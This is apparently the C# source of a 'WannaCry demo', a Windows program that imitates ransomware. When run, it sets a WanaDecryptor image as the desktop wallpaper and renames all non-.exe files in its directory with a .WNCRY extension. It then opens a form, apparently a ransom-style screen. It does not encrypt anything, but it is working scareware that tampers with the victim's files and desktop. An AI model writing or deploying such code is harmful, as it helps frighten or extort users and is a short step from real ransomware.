using System;
using System.IO;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace WannaCrydemo
{

    internal static class Program
    {
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main()
        {
            ExtractFile();
            ChangeWallPaper();
            UpdateExtension();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
            
        }

        //更换壁纸
        [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        public static void ChangeWallPaper()
        {
            string bmpPath = @".\wallpaper\WanaDecryptor.bmp";
            SystemParametersInfo(20, 1, bmpPath, 0x1 | 0x2);
            //删除释放的文件
            DirectoryInfo di = new DirectoryInfo(@".\wallpaper");
            di.Delete(true);
        }

        //释放壁纸文件到wallpaper目录
        private static void ExtractFile()
        {
            string sPath = @".\wallpaper";
            if (!Directory.Exists(sPath))
            {
                Directory.CreateDirectory(sPath);
            }
            string path = @".\wallpaper\WanaDecryptor.bmp";
            MemoryStream memoryStream = new MemoryStream();
            Properties.Resources.WanaDecryptor.Save(memoryStream, Properties.Resources.WanaDecryptor.RawFormat);
            byte[] data = memoryStream.ToArray();
            FileStream file = new FileStream(path, FileMode.Create);
            file.Write(data, 0, data.Length);
            file.Flush();
            file.Close();
        }

        //修改文件扩展为.WNCRY
        static void UpdateExtension()
        {
            string path = Directory.GetCurrentDirectory();

            DirectoryInfo dir = new DirectoryInfo(path);
            FileInfo[] files = dir.GetFiles("*.*", SearchOption.TopDirectoryOnly);
            for (int i = 0; i < files.Length; i++)
            {
                bool isContain = (files[i].FullName.Contains(".exe") || files[i].FullName.Contains(".WNCRY"));

                if (isContain){}
                else
                {
                    files[i].MoveTo(Path.ChangeExtension(files[i].FullName, files[i].Extension+ ".WNCRY"));
                }
            }
        }

    }



}
